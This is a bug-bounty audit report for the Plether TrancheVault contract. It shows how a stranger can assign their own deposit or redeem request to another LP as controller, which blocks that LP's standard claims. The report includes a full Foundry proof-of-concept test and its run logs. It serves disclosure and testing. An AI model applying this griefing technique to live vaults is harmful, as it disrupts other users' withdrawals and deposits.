# \#99912 [SC-Low] Unconsented controller requests block another LP's standard deposit and withdrawal claims

**Submitted on Nov 15th 2026 at 17:56:44 UTC by @legat for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99912
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Asset

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol

## Tested version and environment

```text
Repository: https://github.com/immunefi-team/audit-comp-plether
Commit:     a82d4fefb02768e5b3bddcc97dee371eee24fea8
Category:   Smart Contract
Execution:  Offline Foundry run on the repository's Pool/Vault fixture
Token:      USDG, 6 decimals
Compiler:   Solidity 0.8.35, optimizer 200, via-IR
```

The PoC uses the scoped HousePool, both TrancheVaults, Engine and redemption math sidecar through public LP requests and claims. The repository fixture's `MockSettlementToken` funds actors and `MockPyth` supplies a stable cached mark; neither replaces an in-scope accounting contract. Initial Junior/Senior principal is 30M/20M USDG with 1-USDG seeds, an 800-bps Senior coupon, 40M/80% Senior caps, zero Junior maintenance fee, one-hour LP epochs, VPI factor 0.01e18 and skew ratio 0.4e18. No trader position or manipulated oracle data is needed.

## Impact

Impact: Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Summary

An unrelated LP can submit a funded deposit or redemption request while naming another address as `controller`; that controller need not approve the assignment. If the controller has no existing request head, the stranger's request becomes its default head. The victim's later, fully funded own request can then fail through the standard amount-driven `deposit` or `redeem` alias because the alias selects the stranger's older lot. The exact request-ID methods remain available.

In the deposit leg, a 1-USDG gift makes the victim's later valid 100-USDG default claim revert after 44,142 measured in-call EVM gas units; the no-gift control succeeds. In the redemption variant, the attacker recovers 1,999,974 atoms from a 2-USDG initial position and attaches the residual zero-payout refundable head to the victim. The victim's own funded default `redeem` reverts after 41,469 units; the no-injection control pays 99,998,780 atoms. Recovery, cost and interface limits are stated below.

## Finding Description

### Intended behavior

`IAsyncTrancheVault.sol:8-10` says, “A rejected deposit or refundable redeem head must be cancelled or reclaimed before standard claims advance to a later request” and “request authorization follows ERC-7540 owner approval rules.” The same interface says standard claims consume the controller's oldest request and provides explicit-ID claims. These rules explain how a controller handles its own request heads and allow an owner to name a controller. They do not describe an unrelated owner installing an earlier head that redirects another LP's standard claim. The LOW-39 fix rationale says “unsolicited dust cannot disable the supported self-delivery path”; this supports treating unconsented interference with that path as a defect, although LOW-39 used a different receiver-balance mechanism.

### Actual behavior

`requestDeposit(assets,controller,owner)` authenticates the sender against `owner`, but does not obtain consent from `controller` (`TrancheVault.sol:569-600,1574-1597`). `_appendControllerDeposit` makes that request the controller's head when the controller was idle (`:1742-1755`). The corresponding `requestRedeem` authorizes the redeemed shares, not the named controller (`:606-632`), and `_appendControllerRedeem` sets the same kind of head (`:1783-1798`). An existing older head cannot be preempted, and a same-epoch request merges into its lot.

**Deposit leg.** The attacker requests a 1-USDG Junior deposit with itself as owner and the victim as controller. The victim later escrows 100 USDG in its own epoch. The standard `deposit(100e6,victim)` selects the older 1-USDG gift and reverts `ERC4626ExceededMaxDeposit` (`TrancheVault.sol:955-975,1023-1042,1285-1298`). The PoC measures 44,142 in-call gas units. The no-gift control succeeds. The victim can claim the gift with `maxDeposit(victim)` and then its own request, or call `claimDeposit(requestId,...)` directly; the gift ultimately gives it 1 USDG of shares.

**Refundable redemption-head variant.** The attacker deposits 2 USDG, redeems almost all its shares and recovers 1,999,974 atoms. Its residual shares have a zero-atom `estimateRedeemAssets` value, yet a full-balance request passes the minimum-size exception (`TrancheVault.sol:1611-1617`). It names the idle victim as controller. During settlement the Pool quotes zero and calls `refundRedeemEpochRemainder`, leaving the dust epoch refundable rather than funded (`HousePool.sol:957-986`). The victim's later own roughly 100-USDG redemption funds normally, but `controllerRedeemHead` still points to the earlier refundable head. `maxRedeem(victim)` is exactly zero; `redeem(ownShares,victim,victim)` reverts `ERC4626ExceededMaxRedeem` (`TrancheVault.sol:1006-1011,1152-1166,1299-1311`). Even calling `redeem(maxRedeem(victim),...)` cannot clear the refundable head. The no-injection control pays 99,998,780 atoms, whereas the injected default call uses 41,469 in-call gas units and pays nothing. Explicit-ID `claimRedeem` pays 99,998,171 atoms. To advance the default queue itself, the controller uses the custom `claimRedeemRefund`, which returns the dust shares and starts a fresh one-hour transfer/request cooldown (`TrancheVault.sol:916-947`).

LOW-39, publicly rated Low, concerns receiver dust blocking third-party share delivery. Its fix requires `receiver == controller` at delivery and says “unsolicited dust cannot disable the supported self-delivery path.” This finding instead concerns the earlier insertion of an unconsented **controller** head; that fix does not authorize or check `controller` at request creation. MED-24 publicly describes zero-payout refund-epoch settlement. The distinct root here is the stranger's ability to place that known refundable primitive ahead of another LP's funded controller claim. The deposit leg does not depend on MED-24's refund primitive. These are separate from the disclosed roots under the program's same-root rule (`scope.txt:130`).

## Root Cause

The Vault separates request funding authorization from controller selection. An owner may name any nonzero controller, and `_appendControllerDeposit`/`_appendControllerRedeem` links the request into that controller's oldest-head queue without controller approval (`TrancheVault.sol:569-632,1742-1755,1783-1798`). Standard claim aliases and `max*` views then select only that oldest head (`:955-1019,1285-1311`). An unrelated owner can therefore change which request the victim's standard claim call addresses.

## Impact Explanation

The deposit victim's own 100-USDG claim is valid, but the default call reverts after 44,142 in-call gas units. If the victim consumes the attacker gift it receives 1 USDG of shares; no theft of principal is claimed. In the redemption variant, the victim's own 100-USDG redemption is funded, and the no-attack control pays 99,998,780 atoms. With the refundable stranger head in front, `maxRedeem(victim) == 0` and the standard `redeem` reverts after 41,469 units. A fixed-ABI ERC-7540 consumer using only standard `redeem`/`withdraw` cannot process its funded lot until it integrates a custom refund or explicit-ID claim. `claimRedeemRefund` restarts the one-hour transfer/request cooldown. These recovery methods are available and disclosed; they do not undo the failed call. As an illustration only, at an assumed 0.1 gwei execution gas price and 3,000 USD per ETH, 44,142/41,469 gas units cost about 0.0132/0.0124 USD respectively, excluding transaction intrinsic gas and Arbitrum data fees. No live gas-price claim is made.

## Likelihood Explanation

The attacker needs no role, price control or malicious configuration. It needs one funded request transaction for each targeted idle controller period and cannot preempt an existing head. A same-epoch request merges, so the earlier epoch ordering matters. The deposit leg gives the victim 1 USDG; a client that first uses `maxDeposit(victim)` can consume the gift without a revert. The redemption variant needs a full-balance dust holder for each injected head, initial 2-USDG funding, ordinary gas and time for cooldown/epochs. The target must use a standard amount-driven default alias with its own request amount; exact-ID or custom refund calls escape. These are practical limits on occurrence, not reasons to treat the unconsented insertion as authorized.

## Attack Path / Reproduction Path

1. With the victim controller idle, the attacker submits a funded 1-USDG Junior `requestDeposit` naming that controller. Its epoch matures first.
2. The victim escrows 100 USDG in its own later request. The Pool finalizes it. The victim calls standard `deposit(100e6,victim)`; the alias selects the gift and reverts. The no-gift control succeeds. The victim can claim by explicit ID or consume the gift first.
3. For the redemption variant, the attacker funds 2 USDG, recovers 1,999,974 atoms by redeeming most shares, and assigns its remaining full-balance dust request to the idle victim controller. The Pool refunds that zero-payout head.
4. The victim's own 100-USDG redemption funds in a later epoch. Its standard `redeem(ownShares,victim,victim)` reverts because the older refundable head has `maxRedeem == 0`. The no-injection control pays 99,998,780 atoms; exact-ID `claimRedeem` pays 99,998,171. A custom `claimRedeemRefund` clears the earlier head but begins a new one-hour cooldown.

## External Preconditions

- The in-scope Junior Vault and Pool use ordinary async LP request/claim flows with the release one-hour epoch and five-minute cutoff.
- The attacker can fund 1 USDG for the deposit leg or initially 2 USDG and a full-balance dust position for the redemption variant, and can submit while the target controller is idle.
- The victim later submits a valid own request and uses a standard default claim with the own request's full amount. A fixed-ABI consumer lacking the custom refund or exact-ID path has a stronger integration block on the redemption variant.

## Internal Preconditions

- The stranger's request is earlier in the controller's linked list than the victim's own request. An existing victim head or same-epoch merge defeats preemption.
- The Pool has finalized/funded the victim's own request. The failure comes from default-head selection, not from an unfunded victim lot.
- In the redemption variant, the stranger's full-balance dust head is refunded with zero claimable shares; `redeemRefundPending` is true and `maxRedeem` is zero until custom refund/explicit-ID handling.

## Affected Code

- `packages/perps/src/TrancheVault.sol:569-632,1574-1617`: request creation authorizes the owner but accepts a different controller and a full-balance dust redemption.
- `packages/perps/src/TrancheVault.sol:955-1019,1023-1042,1152-1166,1285-1311`: standard claim aliases and maximum views select only the oldest controller head.
- `packages/perps/src/TrancheVault.sol:1742-1814`: controller request-head insertion and advancement.

## Recommended Mitigation

Require controller authorization or an explicit opt-in before an owner can attach a request to another controller's default queue. Alternatively, keep unsolicited gifts in a separate claim path that cannot become the recipient's default head. Preserve explicit-ID claims and legitimate gifts while preventing unrelated owners from changing another LP's standard claim selection.

## Proof of Concept

### Description

Two Foundry tests use one authored Solidity file. They compare a normal 100-USDG deposit claim with a 1-USDG stranger gift, and a normal 100-USDG redemption with a stranger's zero-payout refundable head. Each branch has a no-injection control, exact revert selector, measured in-call gas and demonstrated exact-ID recovery. The revised redemption test asserts `maxRedeem == 0` and `redeemRefundPending == true`. All in-scope accounting contracts are the pinned repository implementations.

### Where to place files and their names

Clone the pinned repository and save the complete authored source block below at `packages/perps/test/perps/poc/ControllerHeadGiftGriefE2E.t.sol`. No other PoC file is authored. Source SHA-256: `464bee656de86b2548d4b4361ab460b24b0d7c5abe0f069e84e48a978bfcb7c3`. Fresh log SHA-256: `73e49122c122460d275d546192de31bd3d635534691f89a86d43e666aa4a01a4`.

### Command

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git audit-comp-plether
cd audit-comp-plether
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
mkdir -p packages/perps/test/perps/poc
# Save the authored source block below at packages/perps/test/perps/poc/ControllerHeadGiftGriefE2E.t.sol
cd packages/perps
forge test --offline --match-path test/perps/poc/ControllerHeadGiftGriefE2E.t.sol -vv
```

### Fresh run log

```text
Ran 2 tests for test/perps/poc/ControllerHeadGiftGriefE2E.t.sol:ControllerHeadGiftGriefE2E
[PASS] test_NearZeroValueRedeemHeadGriefsDefaultWithdrawal() (gas: 7395404)
Logs:
  attacker recovered initial USDG atoms 1999974
  clean victim default withdrawal assets 99998780
  dust head value atoms 0
  victim failed default withdrawal gas units 41469
  victim funded own redeem shares 100047194002
  explicit-id victim withdrawal assets 99998171

[PASS] test_UnconsentedControllerHeadGriefsValidDefaultClaim() (gas: 4380162)
Logs:
  clean victim default claim shares 100045364614
  victim failed default claim gas units 44142
  victim own claimable escrow atoms 100000000
  attacker gift atoms 1000000
  two-step default recovery shares 100045974399
  explicit-id recovery shares 100045974399

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 8.90ms (4.88ms CPU time)

Ran 1 test suite in 9.29ms (8.90ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

### Full authored source

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {HousePoolAsyncTestBase} from "../shared/HousePoolTestBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Unconsented request controller can become another LP's default claim head.
contract ControllerHeadGiftGriefE2E is HousePoolAsyncTestBase {
    address internal constant ATTACKER = address(0xA11CE);
    address internal constant VICTIM = address(0xB0B);

    function _initialJuniorDeposit() internal pure override returns (uint256) { return 30_000_000e6; }
    function _initialSeniorDeposit() internal pure override returns (uint256) { return 20_000_000e6; }
    function _initialJuniorSeedDeposit() internal pure override returns (uint256) { return 1e6; }
    function _initialSeniorSeedDeposit() internal pure override returns (uint256) { return 1e6; }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory p) {
        p = super._riskParams();
        p.vpiFactor = 0.01e18;
        p.maxSkewRatio = 0.4e18;
    }

    function test_UnconsentedControllerHeadGriefsValidDefaultClaim() public {
        _setSeniorCapacity(40_000_000e6, 8000);
        assertEq(pool.seniorRateBps(), 800);
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6);
        assertEq(pool.maxSeniorShareBps(), 8000);
        assertEq(engine.executionFeeBps(), 4);
        assertEq(juniorVault.maintenanceFeeAprBps(), 0);

        uint256 cleanSnapshot = vm.snapshotState();
        uint256 cleanId = _requestAsyncDeposit(juniorVault, VICTIM, 100e6);
        _settleAsyncRequest(cleanId, false);
        assertEq(juniorVault.maxDeposit(VICTIM), 100e6, "clean default head is victim's lot");
        vm.prank(VICTIM);
        uint256 cleanShares = juniorVault.deposit(100e6, VICTIM);
        assertGt(cleanShares, 0, "same valid default claim succeeds without attack");
        console2.log("clean victim default claim shares", cleanShares);
        assertTrue(vm.revertToState(cleanSnapshot), "restore exact initial state");

        settlementToken.mint(ATTACKER, 1e6);
        vm.startPrank(ATTACKER);
        settlementToken.approve(address(juniorVault), 1e6);
        uint256 giftId = juniorVault.requestDeposit(1e6, VICTIM, ATTACKER);
        vm.stopPrank();
        assertEq(juniorVault.controllerDepositHead(VICTIM), giftId, "attacker appoints victim controller without consent");
        _settleAsyncRequest(giftId, false);

        uint256 victimId = _requestAsyncDeposit(juniorVault, VICTIM, 100e6);
        assertGt(victimId, giftId, "victim's genuine lot queues behind gift");
        _settleAsyncRequest(victimId, false);
        assertEq(juniorVault.claimableDepositRequest(giftId, VICTIM), 1e6);
        assertEq(juniorVault.claimableDepositRequest(victimId, VICTIM), 100e6);
        assertEq(juniorVault.maxDeposit(VICTIM), 1e6, "default max points to stranger's head");

        vm.prank(VICTIM);
        uint256 gasBefore = gasleft();
        (bool ok, bytes memory reason) = address(juniorVault).call(
            abi.encodeWithSignature("deposit(uint256,address)", 100e6, VICTIM)
        );
        uint256 victimGasUsed = gasBefore - gasleft();
        assertFalse(ok, "valid funded default claim must be blocked by injected head");
        assertEq(
            bytes4(reason),
            bytes4(keccak256("ERC4626ExceededMaxDeposit(address,uint256,uint256)")),
            "exact wrong-head amount failure"
        );
        assertGt(victimGasUsed, 21_000, "victim loses real transaction gas");
        assertEq(juniorVault.claimableDepositRequest(victimId, VICTIM), 100e6, "victim's escrow remains claimable only by alternate route");
        console2.log("victim failed default claim gas units", victimGasUsed);
        console2.log("victim own claimable escrow atoms", uint256(100e6));
        console2.log("attacker gift atoms", uint256(1e6));

        uint256 blockedSnapshot = vm.snapshotState();
        vm.prank(VICTIM);
        uint256 giftedShares = juniorVault.deposit(1e6, VICTIM);
        assertGt(giftedShares, 0, "victim can consume stranger's gift");
        assertEq(juniorVault.controllerDepositHead(VICTIM), victimId, "head advances after consuming gift");
        vm.prank(VICTIM);
        uint256 laterShares = juniorVault.deposit(100e6, VICTIM);
        assertGt(laterShares, 0, "two-step default recovery works");
        console2.log("two-step default recovery shares", laterShares);
        assertTrue(vm.revertToState(blockedSnapshot), "restore blocked state for explicit-id recovery");

        vm.prank(VICTIM);
        uint256 explicitShares = juniorVault.claimDeposit(victimId, 100e6, VICTIM, VICTIM);
        assertGt(explicitShares, 0, "explicit-id recovery works without consuming gift");
        console2.log("explicit-id recovery shares", explicitShares);
        assertEq(juniorVault.controllerDepositHead(VICTIM), giftId, "gift head stays when later lot claimed explicitly");
    }

    function test_NearZeroValueRedeemHeadGriefsDefaultWithdrawal() public {
        _setSeniorCapacity(40_000_000e6, 8000);
        assertEq(pool.seniorRateBps(), 800);
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6);
        assertEq(pool.maxSeniorShareBps(), 8000);
        assertEq(juniorVault.maintenanceFeeAprBps(), 0);
        uint256 attackerShares = _fundJuniorDelayed(ATTACKER, 2e6);
        _finishAsyncCooldown(juniorVault, ATTACKER);
        uint256 dustShares = juniorVault.convertToShares(1);
        assertGt(dustShares, 0);
        assertLt(dustShares, attackerShares);
        (, uint256 recoveredAssets) = _claimAsyncRedeem(
            juniorVault,
            _settledAttackerRedeem(attackerShares - dustShares),
            ATTACKER
        );
        assertGe(recoveredAssets, 1e6, "attacker recovers most initial funding");
        assertEq(juniorVault.balanceOf(ATTACKER), dustShares, "attacker retains only near-zero-value dust");
        uint256 dustValue = juniorVault.estimateRedeemAssets(dustShares);
        assertLe(dustValue, 2, "injected redeem head costs at most two USDG atoms");
        console2.log("attacker recovered initial USDG atoms", recoveredAssets);

        uint256 victimShares = _fundJuniorDelayed(VICTIM, 100e6);
        _finishAsyncCooldown(juniorVault, VICTIM);
        uint256 cleanSnapshot = vm.snapshotState();
        uint256 cleanId = _requestAsyncRedeem(juniorVault, VICTIM, victimShares);
        _settleAsyncRequest(cleanId, false);
        vm.prank(VICTIM);
        uint256 cleanAssets = juniorVault.redeem(victimShares, VICTIM, VICTIM);
        assertGe(cleanAssets, 95e6, "victim's own default withdrawal completes without injection");
        console2.log("clean victim default withdrawal assets", cleanAssets);
        assertTrue(vm.revertToState(cleanSnapshot), "restore pre-injection state");

        vm.prank(ATTACKER);
        uint256 dustId = juniorVault.requestRedeem(dustShares, VICTIM, ATTACKER);
        assertEq(juniorVault.controllerRedeemHead(VICTIM), dustId, "stranger appoints victim redeem head");
        _settleAsyncRequest(dustId, false);
        uint256 victimId = _requestAsyncRedeem(juniorVault, VICTIM, victimShares);
        assertGt(victimId, dustId, "victim's own redemption is a later head");
        _settleAsyncRequest(victimId, false);
        assertEq(juniorVault.controllerRedeemHead(VICTIM), dustId, "zero-payout stranger head remains the default");
        assertGe(juniorVault.claimableRedeemRequest(victimId, VICTIM), victimShares, "victim redemption is funded");
        uint256 defaultMax = juniorVault.maxRedeem(VICTIM);
        assertEq(defaultMax, 0, "refundable dust head has no default claimable shares");
        assertTrue(juniorVault.redeemRefundPending(dustId, VICTIM), "dust head requires custom refund claim");

        vm.prank(VICTIM);
        uint256 gasBefore = gasleft();
        (bool ok, bytes memory reason) = address(juniorVault).call(
            abi.encodeWithSignature("redeem(uint256,address,address)", victimShares, VICTIM, VICTIM)
        );
        uint256 victimGasUsed = gasBefore - gasleft();
        assertFalse(ok, "valid funded default withdrawal is blocked by injected head");
        assertEq(
            bytes4(reason),
            bytes4(keccak256("ERC4626ExceededMaxRedeem(address,uint256,uint256)")),
            "exact wrong-head size failure"
        );
        assertGt(victimGasUsed, 21_000, "victim loses real transaction gas for a dust-value gift");
        console2.log("dust head value atoms", dustValue);
        console2.log("victim failed default withdrawal gas units", victimGasUsed);
        console2.log("victim funded own redeem shares", victimShares);

        vm.prank(VICTIM);
        uint256 explicitAssets = juniorVault.claimRedeem(victimId, victimShares, VICTIM, VICTIM);
        assertGe(explicitAssets, 95e6, "explicit-id recovery pays victim despite dust head");
        console2.log("explicit-id victim withdrawal assets", explicitAssets);
    }

    function _settledAttackerRedeem(uint256 shares) internal returns (uint256 requestId) {
        requestId = _requestAsyncRedeem(juniorVault, ATTACKER, shares);
        _settleAsyncRequest(requestId, false);
    }
}
```
